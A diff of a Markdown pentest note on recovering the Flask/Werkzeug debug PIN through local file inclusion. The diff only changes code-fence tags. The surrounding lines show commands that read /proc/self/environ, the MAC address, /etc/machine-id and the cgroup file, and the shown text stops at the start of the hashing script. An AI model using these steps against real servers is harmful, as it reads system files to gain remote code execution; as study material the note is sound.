@@ -4,14 +4,13 @@ date: 2024-7-12
 tags: ["python", "flask", "werkzeug", "debug", "LFI"]
 ---
 
----
 ### Retrieve Flask Debug Pin
 
 #### 1. Get user
 
 <div>
 
-```bash
+```console
 cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
 ```
 
@@ -21,7 +20,7 @@ cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
 
 <div>
 
-```
+```console
 +------------------------------+
 | Get from Traceback debug log |
 +------------------------------+
@@ -33,11 +32,11 @@ cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
 
 <div>
 
-```bash
+```console
 cat /sys/class/net/eth0/address
 ```
 
-```bash
+```console
 # Convert to int
 python3 -c "print(int('<MAC_ADDRESS>'.replace(':',''), 16))"
 ```
@@ -48,7 +47,7 @@ python3 -c "print(int('<MAC_ADDRESS>'.replace(':',''), 16))"
 
 <div>
 
-```bash
+```console
 echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 | rev)
 ```
 
@@ -58,7 +57,7 @@ echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 
 
 <div>
 
-```python
+```console
 #!/usr/bin/env python3
 
 import hashlib
